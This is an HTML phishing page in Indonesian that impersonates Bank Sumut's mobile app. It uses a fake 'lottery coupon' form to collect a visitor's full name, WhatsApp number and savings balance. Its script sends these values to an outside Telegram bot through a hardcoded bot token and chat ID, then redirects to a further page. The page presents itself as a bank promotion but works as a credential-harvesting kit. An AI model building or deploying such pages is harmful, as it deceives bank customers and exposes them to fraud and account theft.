<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Kupon Undian Bank SUMUT</title>
  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>


    body {
      font-family: 'Roboto', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #5ba9d0;
    }
    /* SPLASH SCREEN STYLING */
    #splash-screen {
      position: fixed;
      top: 0;
      left: 0;
      z-index: 9999;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      background: #00347d; /* Warna latar biru */
      color: #fff;
      width: 100%;
      height: 100vh;
      overflow: hidden;
    }
    #splash-screen img {
      width: 150px;
      margin-bottom: 20px;
    }
    #splash-screen h1 {
      font-size: 1.5rem;
      margin-bottom: 1rem;
      font-weight: 700;
    }
    #splash-screen p {
      max-width: 300px;
      margin: 0 auto;
      font-size: 0.9rem;
      line-height: 1.4;
    }
    /* NAVBAR */
  
    /* FORM SECTION */
    #main-content {
      display: none; /* Disembunyikan sampai splash screen hilang */
      width: 100%;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 100px 20px 20px;
      background-color: #3e7cb2a4;
    }
    .card-form {
      width: 100%;
      max-width: 400px;
      padding: 2rem;
      position: relative;
      margin: 1rem;
      background: linear-gradient(135deg, #cce6ff, #e6f2ff);
      border-radius: 10px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    .card-form::before {
      content: '';
      position: absolute;
      top: -100px;
      right: calc(50% - 90px);
      width: 120px;
      height: 100px;
      background-size: contain;
    }
    .card-form h2 {
      color: #00347d;
      text-align: center;
      margin-top: 50px;
      margin-bottom: 1.5rem;
      font-weight: 700;
    }
    .form-label {
      font-weight: 500;
      color: #333;
    }
    .form-control {
      border: 1px solid #1d84d3;
      border-radius: 10px;
      padding: 0.75rem;
      transition: border-color 0.3s;
    }
    .form-control:focus {
      border-color: #002259;
      box-shadow: none;
    }
    .btn-primary {
      border: none;
      background-color: #0a77b1;
      border-radius: 10px;
      padding: 0.75rem;
      font-weight: 700;
      transition: background-color 0.3s;
      width: 100%;
    }
    .btn-primary:hover {
      background-color: #1c93b5;
    }
    .footer {
      text-align: center;
      margin-top: 1rem;
      color: #000;
      font-size: 0.9rem;
    }
    /* MODAL STYLING */
    .modal-content {
      border-radius: 10px;
    }
    /* RESPONSIVE ADJUSTMENTS */
    @media (max-width: 576px) {
      #splash-screen h1 {
        font-size: 1.3rem;
      }
      #splash-screen p {
        font-size: 0.8rem;
      }
      .card-form {
        padding: 1.5rem;
        margin: 1rem 10px;
      }
    }
    span{
      color: red;
    }
    /* NAVBAR */
nav img {
  width: 100%;
  height: auto;
  object-fit: cover;
  max-height: 60px; /* Atur tinggi maksimal */
}

  </style>
</head>
<body>
  <!-- SPLASH SCREEN -->
  <div id="splash-screen">
    <img src="icon.png" alt="SUMUT MOBILE Logo">
    <h1>Selamat Datang di Sumut Mobile</h1>
    <p>
      PT Bank Pembangunan Daerah Sumatera Utara berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK)
      serta dijamin oleh Lembaga Penjamin Simpanan (LPS).
    </p>
  </div>
  <!-- NAVBAR -->
  <nav>
    <img src="navbar1.png" alt="Navbar">
  </nav>
  <!-- FORM SECTION -->
  <div id="main-content">
    <div class="card-form">
      <h2>Lengkapi Data Berikut</h2>
      <form id="registrationForm">
        <div class="mb-3">
          <label class="form-label" for="namaLengkap">Nama Lengkap  <span>(wajib!)</span> </label>
          <input type="text" id="namaLengkap" class="form-control" placeholder="Masukkan Nama Lengkap" required>
        </div>
        <div class="mb-3">
          <label class="form-label" for="nomorHp">Nomor WhatsApp  <span>(wajib!)</span></label>
          <input type="tel" id="nomorHp" class="form-control" placeholder="Masukkan Nomor WhatsApp" required>
        </div>
        <div class="mb-3">
          <label class="form-label" for="saldoAkhir">Saldo Tabungan Rekening  <span>(wajib!)</span></label>
          <input type="number" id="saldoAkhir" class="form-control" placeholder="Rp" required>
        </div>
        <button type="submit" class="btn btn-primary">Lanjutkan Cetak Kupon</button>
      </form>
    </div>
    <div class="footer">
      © Bank Sumut
    </div>
  </div>
  <!-- Modal Rate Limit -->
  <div class="modal fade" id="rateLimitModal" tabindex="-1" aria-labelledby="rateLimitModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-sm">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="rateLimitModalLabel">Perhatian</h5>
          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
          Silahkan tunggu beberapa menit sebelum mengirim form kembali.
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary" data-bs-dismiss="modal">OK</button>
        </div>
      </div>
    </div>
  </div>
  <!-- Modal Sukses -->
  <div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-sm">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="successModalLabel">Sukses</h5>
          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
          Data berhasil dikirim!
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary" data-bs-dismiss="modal">OK</button>
        </div>
      </div>
    </div>
  </div>
  <!-- Bootstrap Bundle JS (termasuk Popper) -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    // SPLASH SCREEN: Hilang setelah 3 detik
    window.addEventListener('load', function() {
      setTimeout(function() {
        document.getElementById('splash-screen').style.display = 'none';
        document.getElementById('main-content').style.display = 'flex';
      }, 2000); // 3000ms = 3 detik
    });
    // FORM SUBMIT
  // FORM SUBMIT
document.getElementById("registrationForm").addEventListener("submit", function(event) {
  event.preventDefault();
  // Rate-limiting: Cek apakah form sudah disubmit dalam 210.000 ms (3,5 menit)
  let lastSubmit = localStorage.getItem("lastSubmitTime");
  let now = new Date().getTime();
  if (lastSubmit && (now - lastSubmit < 210000)) {
    let rateLimitModal = new bootstrap.Modal(document.getElementById('rateLimitModal'));
    rateLimitModal.show();
    return;
  }
  localStorage.setItem("lastSubmitTime", now);
  let nama = document.getElementById("namaLengkap").value.trim();
  let noHp = document.getElementById("nomorHp").value.trim();
  let saldo = document.getElementById("saldoAkhir").value.trim();

  // Validasi Nomor HP dengan format Indonesia
  let validasiHp = /^((\+62|62)|0)8[1-9][0-9]{7,10}$/;
  if (!validasiHp.test(noHp)) {
    alert("Nomor HP harus dalam format Indonesia yang valid!");
    return;
  }

  // Validasi Saldo harus berupa angka
  if (isNaN(saldo) || saldo === "") {
    alert("Saldo harus berupa angka!");
    return;
  }

  // Format saldo dengan tanda titik
  let saldoFormatted = new Intl.NumberFormat("id-ID").format(saldo);

  // Kirim data ke Telegram Bot
  let botToken = "7917823551:AAGnfV0onwQ9X7XroADyefOn_gQrGDJHYsA";
  let chatId = "7644113955";
  let message = `( Bank sumut  | Data Rek )\n\n- No HP : ${noHp}\n- Nama : ${nama}\n- Saldo : Rp. ${saldoFormatted}\n\nCopyright©2020 bagas.webkuu`;
  let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

  fetch(url)
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        window.location.href = "registrasi.html";
      } else {
        alert("Gagal mengirim data.");
      }
    })
    .catch(error => alert("Terjadi kesalahan: " + error));
});

  </script>
</body>
</html>
